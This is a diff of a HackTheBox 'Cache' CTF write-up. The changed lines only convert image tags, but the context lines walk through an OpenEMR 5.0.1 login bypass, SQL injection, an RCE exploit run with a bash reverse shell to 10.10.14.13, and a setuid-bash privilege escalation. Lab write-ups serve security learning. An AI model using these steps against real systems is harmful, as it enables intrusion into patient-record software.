@@ -19,7 +19,7 @@ PORT   STATE SERVICE
 
 Port 80 reveals a blog like website:
 
-<figure><img src="../../../.gitbook/assets/image (2633).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2633).png>)
 
 There's not much here, but we can add `cache.htb` to our `/etc/hosts` file since there's a banner for it on screen. I ran a `gobuster` and `wfuzz` scan on the machine. Funnily, I accidentally had a typo in my `wfuzz` command, and found a completely new domain present:
 
@@ -45,7 +45,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 The page shows us a login for OpenEMR, which is known to have a ton of vulnerabilities:
 
-<figure><img src="../../../.gitbook/assets/image (2872).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2872).png>)
 
 We can head to the Github Repo for this software and attempt to find its version using the default files present:
 
@@ -53,7 +53,7 @@ We can head to the Github Repo for this software and attempt to find its version
 
 Visiting `sql_patch.php` reveals that this is OpenEMR 5.0.1:
 
-<figure><img src="../../../.gitbook/assets/image (1667).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1667).png>)
 
 This version has quite a few RCE exploits for it:
 
@@ -76,11 +76,11 @@ To bypass it, all we have to do is simply visit `/portal/account/register.php`, 
 
 Firstly, visiting `/portal/find_appt_popup_user.php` just works as we have 'bypassed' the login.
 
-<figure><img src="../../../.gitbook/assets/image (2060).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2060).png>)
 
 For this case, the second PoC listed works best.
 
-<figure><img src="../../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(480).png>)
 
 Using `sqlmap`, we can enumerate and view the stuff in the database. (skipped the enumeration)
 
@@ -119,7 +119,7 @@ Remember to use `python2`.
 $ python2 45161.py -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1' http://hms.htb
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3650).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3650).png>)
 
 ## Privilege Escalation
 
@@ -152,7 +152,7 @@ $(function(){
 
 Using that password, we can `su` to `ash`.
 
-<figure><img src="../../../.gitbook/assets/image (2505).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2505).png>)
 
 ### Memcache
 
@@ -222,4 +222,4 @@ root@ee809b31a278:~# chmod u+s /bin/bash
 
 Then we can exit this and get a shell with EUID of `root`.
 
-<figure><img src="../../../.gitbook/assets/image (4010).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4010).png>)
